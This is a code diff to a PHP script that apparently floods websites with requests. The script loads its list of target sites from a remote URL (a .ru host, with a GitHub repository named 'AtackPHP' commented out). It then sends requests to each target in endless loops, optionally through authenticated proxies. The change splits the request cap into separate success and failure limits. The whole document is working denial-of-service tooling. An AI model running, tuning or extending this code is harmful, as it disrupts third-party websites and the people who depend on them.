@@ -3,7 +3,8 @@
     $total = 0;
     $count = 0;
 
-    $sessionMaxRequests = 10;//5000;
+    $sessionMaxRequestsSuccess = 5000;
+    $sessionMaxRequestsFailed = 10;//5000;
 
     $hosts = json_decode(file_get_contents('http://rockstarbloggers.ru/hosts.json'), true);
     //$hosts = json_decode(file_get_contents('https://raw.githubusercontent.com/DanylovkyiAM/AtackPHP/main/hosts.json'), true);
@@ -33,7 +34,7 @@
                 foreach ($data['proxy'] as $proxy) {
                     while (true){
                         request($data['site']['page'], $proxy['ip'], $proxy['auth']);
-                        if($count > $sessionMaxRequests){
+                        if($count > $sessionMaxRequestsFailed){
                             break;
                         }
                     }
@@ -41,7 +42,7 @@
             }else{
                 while (true){
                     request($data['site']['page']);
-                    if($count > $sessionMaxRequests){
+                    if($count > $sessionMaxRequestsSuccess){
                         break;
                     }
                 }
